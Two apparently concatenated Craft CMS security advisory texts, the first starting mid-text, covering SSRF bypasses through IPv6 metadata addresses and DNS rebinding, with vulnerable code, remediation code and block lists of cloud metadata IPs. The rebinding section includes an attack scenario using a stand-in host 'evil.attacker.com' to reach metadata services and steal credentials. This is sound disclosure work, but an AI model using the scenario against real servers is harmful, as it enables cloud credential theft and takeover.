**Attacker can now achieve code execution by creating new EC2 instances with their SSH key**\n\n---\n\n## Remediation\n\nReplace `gethostbyname()` with `dns_get_record()` to check both IPv4 and IPv6:\n\n```php\n// Resolve both IPv4 and IPv6 addresses\n$records = @dns_get_record($hostname, DNS_A | DNS_AAAA);\nif ($records === false) {\n    $records = [];\n}\n\n// Blocked IPv6 metadata prefixes\n$blockedIPv6Prefixes = [\n    'fd00:ec2::',       // AWS IMDS, DNS, NTP\n    'fd20:ce::',        // GCP Metadata\n    '::1',              // Loopback\n    'fe80:',            // Link-local\n    '::ffff:',          // IPv4-mapped IPv6\n];\n\nforeach ($records as $record) {\n    // Check IPv4 (existing logic)\n    if (isset($record['ip']) && in_array($record['ip'], $blockedIPv4)) {\n        return false;\n    }\n\n    // Check IPv6 (NEW)\n    if (isset($record['ipv6'])) {\n        foreach ($blockedIPv6Prefixes as $prefix) {\n            if (str_starts_with($record['ipv6'], $prefix)) {\n                return false;\n            }\n        }\n    }\n}\n```\n\n### Additional Mitigations\n\n| Mitigation | Description |\n|------------|-------------|\n| Block wildcard DNS services | Block nip.io, sslip.io, xip.io suffixes |\n| Use `dns_get_record()` | Resolves both IPv4 and IPv6 |\n\n---\n\n## Resources\n\n- https://github.com/craftcms/cms/commit/2825388b4f32fb1c9bd709027a1a1fd192d709a3\n- [PHP: gethostbyname](https://www.php.net/manual/en/function.gethostbyname.php) - \"Get the **IPv4 address** corresponding to a given Internet host name\"\n- [GHSA-x27p-wfqw-hfcc](https://github.com/advisories/GHSA-x27p-wfqw-hfcc) - Original SSRF vulnerability (CVE-2025-68437)\n- [AWS IMDS IPv6 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)\n- [GCP Metadata Server Documentation](https://cloud.google.com/compute/docs/metadata/querying-metadata)\n- [PayloadsAllTheThings - SSRF Cloud Instances](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md)",

This Time-of-Check-Time-of-Use (TOCTOU) vulnerability enables DNS rebinding attacks, where an attacker’s DNS server returns different IP addresses for validation compared to the actual request.\n\nThis is a bypass of the security fix for CVE-2025-68437 ([GHSA-x27p-wfqw-hfcc](https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc)) that allows access to all blocked IPs, not just IPv6 endpoints.\n\n## Severity\n\nBypass of cloud metadata SSRF protection for all blocked IPs\n\n## Required Permissions\n\nExploitation requires GraphQL schema permissions for:\n- Edit assets in the `<VolumeName>` volume\n- Create assets in the `<VolumeName>` volume\n\nThese permissions may be granted to:\n- Authenticated users with appropriate GraphQL schema access\n- Public Schema (if misconfigured with write permissions)\n\n---\n\n## Technical Details\n\n### Vulnerable Code Flow\n\nThe code at `src/gql/resolvers/mutations/Asset.php` performs two separate DNS lookups:\n\n```php\n// VALIDATION PHASE: First DNS resolution at time T1\nprivate function validateHostname(string $url): bool\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n    $ip = gethostbyname($hostname);  // DNS Lookup #1 - Returns safe IP\n\n    if (in_array($ip, [\n        '169.254.169.254',   // AWS, GCP, Azure IMDS\n        '169.254.170.2',     // AWS ECS metadata\n        '100.100.100.200',   // Alibaba Cloud\n        '192.0.0.192',       // Oracle Cloud\n    ])) {\n        return false;  // Check passes - IP looks safe\n    }\n    return true;\n}\n\n// ... time gap between validation and request ...\n\n// REQUEST PHASE: Second DNS resolution at time T2 (inside Guzzle)\n$response = $client->get($url);  // DNS Lookup #2 - Guzzle resolves DNS AGAIN\n                                  // Now returns 169.254.169.254!\n```\n\n### Root Cause\n\nTwo separate DNS lookups occur:\n1. **Validation**: `gethostbyname()` in `validateHostname()`\n2. **Request**: Guzzle's internal DNS resolution via libcurl\n\nAn attacker controlling a DNS server can return different IPs for each query.\n\n### Bypass Mechanism\n\n```\n+-----------------------------------------------------------------------------+\n| Attacker's DNS Server: evil.attacker.com                                    |\n+-----------------------------------------------------------------------------+\n| Query 1 (Validation - T1):                                                  |\n|   Request:  A record for evil.attacker.com                                  |\n|   Response: 1.2.3.4 (safe IP, TTL: 0)                                       |\n|   Result:   Validation PASSES                                               |\n+-----------------------------------------------------------------------------+\n| Query 2 (Guzzle Request - T2):                                              |\n|   Request:  A record for evil.attacker.com                                  |\n|   Response: 169.254.169.254 (metadata IP, TTL: 0)                           |\n|   Result:   Request goes to blocked IP -> CREDENTIALS STOLEN                |\n+-----------------------------------------------------------------------------+\n```\n\n---\n\n## Target Endpoints via DNS Rebinding\n\nDNS rebinding allows access to all blocked IPs:\n\n| Target | Rebind To | Impact |\n|--------|-----------|--------|\n| **AWS IMDS** | `169.254.169.254` | IAM credentials, instance identity |\n| **AWS ECS** | `169.254.170.2` | Container credentials |\n| **GCP Metadata** | `169.254.169.254` | Service account tokens |\n| **Azure Metadata** | `169.254.169.254` | Managed identity tokens |\n| **Alibaba Cloud** | `100.100.100.200` | Instance credentials |\n| **Oracle Cloud** | `192.0.0.192` | Instance metadata |\n| **Internal Services** | `127.0.0.1`, `10.x.x.x` | Internal APIs, databases |\n\n---\n\n### Attack Scenario\n\n1. Attacker sets up DNS server with alternating responses\n2. Attacker sends mutation with `url: \"http://evil.attacker.com/latest/meta-data/\"`\n3. First DNS query returns safe IP (e.g., `1.2.3.4`) → validation passes\n4. Second DNS query returns metadata IP (`169.254.169.254`) → request to metadata\n5. Attacker retrieves credentials from ANY cloud provider\n6. **Attacker can now achieve code execution by creating new instances with their SSH key**\n\n---\n\n## Remediation\n\n### Fix: DNS Pinning with CURLOPT_RESOLVE\n\nPin the DNS resolution - use the same resolved IP for both validation and request:\n\n```php\nprivate function validateHostname(string $url): bool\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n\n    // Resolve once\n    $ip = gethostbyname($hostname);\n\n    // Validate the resolved IP\n    if (in_array($ip, [\n        '169.254.169.254', '169.254.170.2',\n        '100.100.100.200', '192.0.0.192',\n    ])) {\n        return false;\n    }\n\n    // Store for later use\n    $this->pinnedDNS[$hostname] = $ip;\n\n    return true;\n}\n\n// When making the request - CRITICAL: Use pinned IP\nprotected function makeRequest(string $url): ResponseInterface\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n    $ip = $this->pinnedDNS[$hostname] ?? null;\n\n    $options = [];\n    if ($ip) {\n        // Force Guzzle/curl to use the SAME IP we validated\n        $options['curl'] = [\n            CURLOPT_RESOLVE => [\n                \"$hostname:80:$ip\",\n                \"$hostname:443:$ip\"\n            ]\n        ];\n    }\n\n    return $this->client->get($url, $options);\n}\n```\n\n### Alternative: Single Resolution with Immediate Use\n\n```php\n// Resolve to IP and use IP directly in URL\n$ip = gethostbyname($hostname);\n\nif (in_array($ip, $blockedIPs)) {\n    return false;\n}\n\n// Make request directly to IP with Host header\n$client->get(\"http://$ip\" . parse_url($url, PHP_URL_PATH), [\n    'headers' => [\n        'Host' => $hostname\n    ]\n]);\n```\n\n### Additional Mitigations\n\n| Mitigation | Description |\n|------------|-------------|\n| DNS Pinning (CURLOPT_RESOLVE) | Force same IP for validation and request |\n| Single IP-based request | Use resolved IP directly in URL |\n| Implement IMDSv2 | Requires token header (infrastructure-level) |\n| Network egress filtering | Block metadata IPs at network level |\n\n---\n\n## Resources\n\n- https://github.com/craftcms/cms/commit/a4cf3fb63bba3249cf1e2882b18a2d29e77a8575\n- [GHSA-x27p-wfqw-hfcc](https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc) - Original SSRF vulnerability (CVE-2025-68437)\n- [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) - Lightweight Python DNS server for testing DNS rebinding vulnerabilities; responds with legitimate IP for first N queries, then rebinds to target IP\n- [Singularity DNS Rebinding Tool](https://github.com/nccgroup/singularity)\n- [rbndr DNS Rebinding Service](https://github.com/taviso/rbndr)\n- [DNS Rebinding Attacks Explained](https://unit42.paloaltonetworks.com/dns-rebinding/)\n- [CURLOPT_RESOLVE Documentation](https://curl.se/libcurl/c/CURLOPT_RESOLVE.html)\n- OWASP SSRF Prevention Cheat Sheet",
